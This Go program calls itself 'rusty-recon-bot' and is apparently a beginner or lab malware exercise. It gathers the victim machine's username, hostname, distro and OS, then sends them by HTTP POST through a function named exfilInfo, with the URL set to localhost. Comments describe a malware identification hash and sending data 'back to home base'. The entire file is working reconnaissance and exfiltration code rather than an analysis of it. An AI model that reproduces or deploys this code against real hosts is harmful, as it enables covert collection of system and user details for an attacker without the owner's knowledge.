package main

import (
	"fmt"
	"encoding/json"
	"os"
	"os/user"
	"runtime"
	"github.com/zcalusic/sysinfo"

	"net/http"
	"strings"
	"io/ioutil"
)

func collectInfo() string {
	returnString := "================= SYSINFO =================\n"

	// Obtaining info using the runtime and os libraries
	currentuser, _ := user.Current()
	username := currentuser.Username
	hostname, _ := os.Hostname()
	platform := runtime.GOOS

	// Going on a quest to obtain distro info
	// TODO: Surely there's a better way of doing this
	// TODO: Maybe make my own version of the whoami crate in Rust
	var si sysinfo.SysInfo
	si.GetSysInfo()

	jsonData, _ := json.Marshal(&si)

	var data map[string]interface{}
	err := json.Unmarshal([]byte(jsonData), &data)
	checkError(err)
	osInfo := data["os"].(map[string]interface{})
	distro := osInfo["name"].(string)

	// Assembling the string
	strUsername := "❓ Username: " + username + "\n"
	strHostname := "🏡 Hostname: " + hostname + "\n"
	strDistro := "📀 Distro: " + distro + "\n"
	strPlatform := "🖥️ Release: " + platform + "\n"

	returnString = returnString + strUsername + strHostname + strDistro + strPlatform
	return returnString
}

func exfilInfo(info string, url string) {
	fmt.Println("[*] Sending the following info: ")
	fmt.Println(info)
	
	body := strings.NewReader(info) // needs it as a reader format
	req, err := http.NewRequest("POST", url, body)
	checkError(err)
	
	res, err := http.DefaultClient.Do(req)
	checkError(err)

	// maybe the server can respond with something ¯\_(ツ)_/¯
	data, _ := ioutil.ReadAll(res.Body) 
	res.Body.Close()
	Use(data)

	fmt.Println("[+] Success!")
}

func checkError(e error){
	if e != nil {
		fmt.Printf("Something went wrong! %s\n", e)
		os.Exit(1)
	}
}

// https://stackoverflow.com/questions/21743841/how-to-avoid-annoying-error-declared-and-not-used
func Use(vals ...interface{}) {
    for _, val := range vals {
        _ = val
    }
}

func main(){
	// Imprint string for malware identification
    // let imprint_string = md5sum(Engineer's Name:Favorite TCG Card)
	// kali@kali~:$ echo 'an00b:yoggsaron' | md5sum
	// 	f4b76de3b87463baa926ecd58fdbcb69
	imprint := "f4b76de3b87463baa926ecd58fdbcb69"
	Use(imprint)

	fmt.Println("[!] Beep boop, I am rusty-recon-bot! I will collect information from this endpoint and send it back to home base.")
	returnString := collectInfo()
	exfilInfo(returnString, "http://127.0.0.1")
	fmt.Println("[*] All done! Goodbye!")
}